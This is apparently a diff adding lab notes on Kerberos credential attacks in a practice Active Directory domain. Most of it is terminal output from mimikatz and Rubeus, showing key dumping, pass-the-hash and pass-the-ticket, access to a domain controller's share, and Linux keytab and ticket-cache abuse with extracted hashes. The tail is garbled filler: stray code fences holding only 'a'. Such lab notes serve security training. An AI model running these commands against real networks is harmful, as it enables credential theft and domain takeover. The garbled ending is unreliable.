+doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID/aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT02jggPLMIIDx6ADAgESoQMCAQKiggO5BIIDtc6ptErl3sAxJsqVTkV84/IcqkpopGPYMWzPcXaZgPK9hL0579FGJEBXX+Ae90rOcpbrbErMr52WEVa/E2vVsf37546ScP0+9LLgwOAoLLkmXAUqP4zJw47nFjbZQ3PHs+vt6LI1UnGZoaUNcn1xI7VasrDoFakj/ZH+GZ7EjgpBQFDZy0acNL8cK0AIBIe8fBF5K7gDPQugXaB6diwoVzaO/E/p8m3t35CR1PqutI5SiPUNim0s/snipaQnyuAZzOqFmhwPPujdwOtm1jvrmKV1zKcEo2CrMb5xmdoVkSn4L6AlX328K0+OUILS5GOe2gX6Tv1zw1F9ANtEZF6FfUk9A6E0dc/OznzApNlRqnJ0dq45mD643HbewZTV8YKS/lUovZ6WsjsyOy6UGKj+qF8WsOK1YsO0rW4ebWJOnrtZoJXryXYDf+mZ43yKcS10etHsq1B2/XejadVr1ZY7HKoZKi3gOx3ghk8foGPfWE6kLmwWnT16COWVI69D9pnxjHVXKbB5BpQWAFUtEGNlj7zzWTPEtZMVGeTQOZ0FfWPRS+EgLmxUc47GSVON7jhOTx3KJDmE7WHGsYzkWtKFxKEWMNxIC03P7r9seEo5RjS/WLant4FCPI+0S/tasTp6GGP30lbZT31WQER49KmSC75jnfT/9lXMVPHsA3VGG2uwGXbq1H8UkiR0ltyD99zDVTmYZ1aP4y63F3Av9cg3dTnz60hNb7H+AFtfCjHGWdwpf9HZ0u0HlBHSA7pYADoJ9+ioDghL+cqzPn96VyDcqbauwX/FqC/udT+cgmkYFzSIzDhZv6EQmjUL4b2DFL/Mh8BfHnFCHLJdAVRdHlLEEl1MdK9/089O06kD3qlE6s4hewHwqDy39ORxAHHQBFPU211nhuU4Jofb97d7tYxn8f8c5WxZmk1nPILyAI8u9z0nbOVbdZdNtBg5sEX+IRYyY7o0z9hWJXpDPuk0ksDgDckPWtFvVqX6Cd05yP2OdbNEeWns9JV2D5zdS7Q8UMhVo7z4GlFhT/eOopfPc0bxLoOv7y4fvwhkFh/9LfKu6MLFneNff0Duzjv9DQOFd1oGEnA4MblzOcBscoH7CuscQQ8F5xUCf72BVY5mShq8S89FG9GtYotmEUe/j+Zk6QlGYVGcnNcDxIRRuyI1qJZxCLzKnL1xcKBF4RblLcUtkYDT+mZlCSvwWgpieq1VpQg42Cjhxz/+xVW4Vm7cBwpMc77Yd1+QFv0wBAq5BHvPJI4hCVPs7QejgdgwgdWgAwIBAKKBzQSByn2BxzCBxKCBwTCBvjCBu6ArMCmgAwIBEqEiBCDY03fB0LgV+lC6dRSAr4xk7x/bTG1cXR1uYhqBY/RS7aEJGwdIVEIuQ09NohYwFKADAgEBoQ0wCxsJcGxhaW50ZXh0owcDBQBA4QAApREYDzIwMjIwNzEyMTM0MjE1WqYRGA8yMDIyMDcxMjIzNDIxNVqnERgPMjAyMjA3MTkxMzQyMTVaqAkbB0hUQi5DT02pHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT00=
+<SNIP>
+```
+```
+c:\tools> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::ekeys
+
+<SNIP>
+
+Authentication Id : 0 ; 444066 (00000000:0006c6a2)
+Session           : Interactive from 1
+User Name         : plaintext
+Domain            : HTB
+Logon Server      : DC01
+Logon Time        : 7/12/2022 9:42:15 AM
+SID               : S-1-5-21-228825152-3134732153-3833540767-1107
+
+         * Username : plaintext
+         * Domain   : inlanefreight.htb
+         * Password : (null)
+         * Key List :
+           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
+           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
+<SNIP>
+```
+```
+c:\tools> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+
+user    : plaintext
+domain  : inlanefreight.htb
+program : cmd.exe
+impers. : no
+NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
+  |  PID  1128
+  |  TID  3268
+  |  LSA Process is now R/W
+  |  LUID 0 ; 3414364 (00000000:0034195c)
+  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
+  \_ kerberos - data copy @ 000001C7E20EE578
+   \_ aes256_hmac       -> null
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 000001C7E2136BC8 (32) -> null
+```
+```
+c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
+[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
+[+] TGT request successful!
+[*] Base64(ticket.kirbi):
+
+doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/LSsa2xrdJJir1eVugDFCoGFT2hDcYcpRdifXw67WofDM6Z6utsha+4bL0z6QN+tdpPlNQFwjuWmBrZtpS9TcCblotYvDHa0aLVsroW/fqXJ4KIV2tVfbVIDJvPkgdNAbhp6NvlbzeakR1oO5RTm7wtRXeTirfo6C9Ap0HnctlHAd+Qnvo2jGUPP6GHIhdlaM+QShdJtzBEeY/xIrORiiylYcBvOoir8mFEzNpQgYADmbTmg+c7/NgNO8Qj4AjrbGjVf/QWLlGc7sH9+tARi/Gn0cGKDK481A0zz+9C5huC9ZoNJ/18rWfJEb4P2kjlgDI0/fauT5xN+3NlmFVv0FSC8/909pUnovy1KkQaMgXkbFjlxeheoPrP6S/TrEQ8xKMyrz9jqs3ENh//q738lxSo8J2rZmv1QHy+wmUKif4DUwPyb4AHgSgCCUUppIFB3UeKjqB5srqHR78YeAWgY7pgqKpKkEomy922BtNprk2iLV1cM0trZGSk6XJ/H+JuLHI5DkuhkjZQbb1kpMA2CAFkEwdL9zkfrsrdIBpwtaki8pvcBPOzAjXzB7MWvhyAQevHCT9y6iDEEvV7fsF/B5xHXiw3Ur3P0xuCS4K/Nf4GC5PIahivW3jkDWn3g/0nl1K9YYX7cfgXQH9/inPS0OF1doslQfT0VUHTzx8vG3H25vtc2mPrfIwfUzmReLuZH8GCvt4p2BAbHLKx6j/HPa4+YPmV0GyCv9iICucSwdNXK53Q8tPjpjROha4AGjaK50yY8lgknRA4dYl7+O2+j4K/lBWZHy+IPgt3TO7YFoPJIEuHtARqigF5UzG1S+mefTmqpuHmoq72KtidINHqi+GvsvALbmSBQaRUXsJW/Lf17WXNXmjeeQWemTxlysFs1uRw9JlPYsGkXFh3fQ2ngax7JrKiO1/zDNf6cvRpuygQRHMOo5bnWgB2E7hVmXm2BTimE7axWcmopbIkEi165VOy/M+pagrzZDLTiLQOP/X8D6G35+srSr4YBWX4524/Nx7rPFCggxIXEU4zq3Ln1KMT9H7efDh+h0yNSXMVqBSCZLx6h3Fm2vNPRDdDrq7uz5UbgqFoR2tgvEOSpeBG5twl4MSh6VA7LwFi2usqqXzuPgqySjA1nPuvfy0Nd14GrJFWo6eDWoOy2ruhAYtaAtYC6OByDCBxaADAgEAooG9BIG6fYG3MIG0oIGxMIGuMIGroBswGaADAgEXoRIEENEzis1B3YAUCjJPPsZjlduhCRsHSFRCLkNPTaIWMBSgAwIBAaENMAsbCXBsYWludGV4dKMHAwUAQOEAAKURGA8yMDIyMDcxMjE1MjgyNlqmERgPMjAyMjA3MTMwMTI4MjZapxEYDzIwMjIwNzE5MTUyODI2WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdodGIuY29t
+
+  ServiceName           :  krbtgt/inlanefreight.htb
+  ServiceRealm          :  inlanefreight.htb
+  UserName              :  plaintext
+  UserRealm             :  inlanefreight.htb
+  StartTime             :  7/12/2022 11:28:26 AM
+  EndTime               :  7/12/2022 9:28:26 PM
+  RenewTill             :  7/19/2022 11:28:26 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType               :  rc4_hmac
+  Base64(key)           :  0TOKzUHdgBQKMk8+xmOV2w==
+```
+```
+c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
+[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
+[+] TGT request successful!
+[*] Base64(ticket.kirbi):
+
+      doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKh
+      EzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpcGX6rbUlYxOWeMmu/zb
+      f7vGgDj/g+P5zzLbr+XTIPG0kI2WCOlAFCQqz84yQd6IRcEeGjG4YX/9ezJogYNtiLnY6YPkqlQaG1Nn
+      pAQBZMIhs01EH62hJR7W5XN57Tm0OLF6OFPWAXncUNaM4/aeoAkLQHZurQlZFDtPrypkwNFQ0pI60NP2
+      9H98JGtKKQ9PQWnMXY7Fc/5j1nXAMVj+Q5Uu5mKGTtqHnJcsjh6waE3Vnm77PMilL1OvH3Om1bXKNNan
+      JNCgb4E9ms2XhO0XiOFv1h4P0MBEOmMJ9gHnsh4Yh1HyYkU+e0H7oywRqTcsIg1qadE+gIhTcR31M5mX
+      5TkMCoPmyEIk2MpO8SwxdGYaye+lTZc55uW1Q8u8qrgHKZoKWk/M1DCvUR4v6dg114UEUhp7WwhbCEtg
+      5jvfr4BJmcOhhKIUDxyYsT3k59RUzzx7PRmlpS0zNNxqHj33yAjm79ECEc+5k4bNZBpS2gJeITWfcQOp
+      lQ08ZKfZw3R3TWxqca4eP9Xtqlqv9SK5kbbnuuWIPV2/QHi3deB2TFvQp9CSLuvkC+4oNVg3VVR4bQ1P
+      fU0+SPvL80fP7ZbmJrMan1NzLqit2t7MPEImxum049nUbFNSH6D57RoPAaGvSHePEwbqIDTghCJMic2X
+      c7YJeb7y7yTYofA4WXC2f1MfixEEBIqtk/drhqJAVXz/WY9r/sWWj6dw9eEhmj/tVpPG2o1WBuRFV72K
+      Qp3QMwJjPEKVYVK9f+uahPXQJSQ7uvTgfj3N5m48YBDuZEJUJ52vQgEctNrDEUP6wlCU5M0DLAnHrVl4
+      Qy0qURQa4nmr1aPlKX8rFd/3axl83HTPqxg/b2CW2YSgEUQUe4SqqQgRlQ0PDImWUB4RHt+cH6D563n4
+      PN+yqN20T9YwQMTEIWi7mT3kq8JdCG2qtHp/j2XNuqKyf7FjUs5z4GoIS6mp/3U/kdjVHonq5TqyAWxU
+      wzVSa4hlVgbMq5dElbikynyR8maYftQk+AS/xYby0UeQweffDOnCixJ9p7fbPu0Sh2QWbaOYvaeKiG+A
+      GhUAUi5WiQMDSf8EG8vgU2gXggt2Slr948fy7vhROp/CQVFLHwl5/kGjRHRdVj4E+Zwwxl/3IQAU0+ag
+      GrHDlWUe3G66NrR/Jg8zXhiWEiViMd5qPC2JTW1ronEPHZFevsU0pVK+MDLYc3zKdfn0q0a3ys9DLoYJ
+      8zNLBL3xqHY9lNe6YiiAzPG+Q6OByDCBxaADAgEAooG9BIG6fYG3MIG0oIGxMIGuMIGroBswGaADAgEX
+      oRIEED0RtMDJnODs5w89WCAI3bChCRsHSFRCLkNPTaIWMBSgAwIBAaENMAsbCXBsYWludGV4dKMHAwUA
+      QOEAAKURGA8yMDIyMDcxMjE2Mjc0N1qmERgPMjAyMjA3MTMwMjI3NDdapxEYDzIwMjIwNzE5MTYyNzQ3
+      WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdodGIuY29t
+[+] Ticket successfully imported!
+
+  ServiceName           :  krbtgt/inlanefreight.htb
+  ServiceRealm          :  inlanefreight.htb
+  UserName              :  plaintext
+  UserRealm             :  inlanefreight.htb
+  StartTime             :  7/12/2022 12:27:47 PM
+  EndTime               :  7/12/2022 10:27:47 PM
+  RenewTill             :  7/19/2022 12:27:47 PM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType               :  rc4_hmac
+  Base64(key)           :  PRG0wMmc4OznDz1YIAjdsA==
+```
+```
+c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.5.0
+
+
+[*] Action: Import Ticket
+[+] ticket successfully imported!
+
+c:\tools> dir \\DC01.inlanefreight.htb\c$
+Directory: \\dc01.inlanefreight.htb\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/4/2022  11:17 AM                Program Files
+d-----         6/4/2022  11:17 AM                Program Files (x86)
+
+...SNIP...
+```
+```
+PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+
+doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQzYYQAAAQtMIQAAAQnoIQAAAADAgEFoYQAAAAJGwdIVEIuQ09NooQAAAAsMIQAAAAmoIQAAAADAgECoYQAAAAXMIQAAAARGwZrcmJ0Z3QbB0hUQi5DT02jhAAAA9cwhAAAA9GghAAAAAMCARKhhAAAAAMCAQKihAAAA7kEggO1zqm0SuXewDEmypVORXzj8hyqSmikY9gxbM9xdpmA8r2EvTnv0UYkQFdf4B73Ss5ylutsSsyvnZYRVr8Ta9Wx/fvnjpJw/T70suDA4CgsuSZcBSo/jMnDjucWNtlDc8ez6...SNIP...
+```
+```
+c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.5.0
+
+
+[*] Action: Import Ticket
+[+] ticket successfully imported!
+
+c:\tools> dir \\DC01.inlanefreight.htb\c$
+Directory: \\dc01.inlanefreight.htb\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/4/2022  11:17 AM                Program Files
+d-----         6/4/2022  11:17 AM                Program Files (x86)
+
+<SNIP>
+```
+```
+C:\tools> mimikatz.exe 
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+
+* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
+mimikatz # exit
+Bye!
+
+c:\tools> dir \\DC01.inlanefreight.htb\c$
+
+Directory: \\dc01.inlanefreight.htb\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/4/2022  11:17 AM                Program Files
+d-----         6/4/2022  11:17 AM                Program Files (x86)
+
+<SNIP>
+```
+
+#### Mimikatz - PowerShell Remoting with Pass the Ticket
+
+```
+C:\tools> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+
+* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
+
+mimikatz # exit
+Bye!
+
+c:\tools>powershell
+Windows PowerShell
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+inlanefreight\john
+[DC01]: PS C:\Users\john\Documents> hostname
+DC01
+[DC01]: PS C:\Users\john\Documents>
+```
+
+#### Rubeus - PowerShell Remoting with Pass the Ticket
+
+```
+C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.3
+
+
+[*] Action: Create process (/netonly)
+
+
+[*] Using random username and password.
+
+[*] Showing process : True
+[*] Username        : JMI8CL7C
+[*] Domain          : DTCDV6VL
+[*] Password        : MRWI6XGI
+[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 1556
+[+] LUID            : 0xe07648
+```
+```
+C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.3
+
+[*] Action: Ask TGT
+
+[*] Using aes256_cts_hmac_sha1 hash: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
+[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\john'
+[*] Using domain controller: 10.129.203.120:88
+[+] TGT request successful!
+[*] Base64(ticket.kirbi):
+
+      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRC
+      oiYwJKADAgECoR0wGxsGa3JidGd0GxFpbmxhbmVmcmVpZ2h0Lmh0YqOCBFAwggRMoAMCARKhAwIBAqKC
+      BD4EggQ6JFh+c/cFI8UqumM6GPaVpUhz3ZSyXZTIHiI/b3jOFtjyD/uYTqXAAq2CkakjomzCUyqUfIE5
+      +2dvJYclANm44EvqGZlMkFvHK40slyFEK6E6d7O+BWtGye2ytdJr9WWKWDiQLAJ97nrZ9zhNCfeWWQNQ
+      dpAEeCZP59dZeIUfQlM3+/oEvyJBqeR6mc3GuicxbJA743TLyQt8ktOHU0oIz0oi2p/VYQfITlXBmpIT
+      OZ6+/vfpaqF68
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/inlanefreight.htb
+  ServiceRealm             :  INLANEFREIGHT.HTB
+  UserName                 :  john
+  UserRealm                :  INLANEFREIGHT.HTB
+  StartTime                :  7/18/2022 5:44:50 AM
+  EndTime                  :  7/18/2022 3:44:50 PM
+  RenewTill                :  7/25/2022 5:44:50 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  5VdAaevnpxx/f9rXsDDLfK6tH+4qQ3f1GlOB1ClBWh0=
+  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC
+
+c:\tools>powershell
+Windows PowerShell
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+inlanefreight\john
+[DC01]: PS C:\Users\john\Documents> hostname
+DC01
+```
+
+#### Pass the Ticket (PtT) from Linux
+
+```
+david@inlanefreight.htb@linux01:~$ realm list
+
+inlanefreight.htb
+  type: kerberos
+  realm-name: INLANEFREIGHT.HTB
+  domain-name: inlanefreight.htb
+  configured: kerberos-member
+  server-software: active-directory
+  client-software: sssd
+  required-package: sssd-to
+```
+```
+david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
+
+root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
+root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
+root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
+root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
+```
+
+```
+avid@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
+
+...SNIP...
+
+   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
+   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
+```
+
+```
+carlos@inlanefreight.htb@linux01:~$ crontab -l
+
+# Edit this file to introduce tasks to be run by cron.
+# 
+...SNIP...
+# 
+# m h  dom mon dow   command
+*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+#!/bin/bash
+
+kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
+```
+
+```
+david@inlanefreight.htb@linux01:~$ env | grep -i krb5
+
+KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+```
+```
+david@inlanefreight.htb@linux01:~$ ls -la /tmp
+
+total 68
+drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
+drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
+-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
+-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
+-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
+```
+```
+david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 
+
+Keytab name: FILE:/opt/specialfiles/carlos.keytab
+KVNO Timestamp           Principal
+---- ------------------- ------------------------------------------------------
+   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
+```
+
+```
+david@inlanefreight.htb@linux01:~$ klist 
+
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: david@INLANEFREIGHT.HTB
+
+Valid starting     Expires            Service principal
+10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+        renew until 10/07/22 17:02:11
+david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+david@inlanefreight.htb@linux01:~$ klist 
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: carlos@INLANEFREIGHT.HTB
+
+Valid starting     Expires            Service principal
+10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+        renew until 10/07/22 17:16:11
+```
+
+```
+david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
+
+  .                                   D        0  Thu Oct  6 14:46:26 2022
+  ..                                  D        0  Thu Oct  6 14:46:26 2022
+  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022
+
+                7706623 blocks of size 4096. 4452852 blocks available
+```
+##### KeyTab Extract
+
+[KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
+```
+david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : INLANEFREIGHT.HTB
+        SERVICE PRINCIPAL : carlos/
+        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+```
+```
+a
+```
+```
+a
+```
+
+```
+a
+```
+
+```
+a
+```
+
 ```
 a
 ```
@@ -1126,96 +2182,17 @@ a
 ```
 a
 ```
+
 ```
 a
 ```
+
 ```
 a
 ```
+
 ```
 a
 ```
-```
-a
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-``````
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
-```
-a
-```
+
 
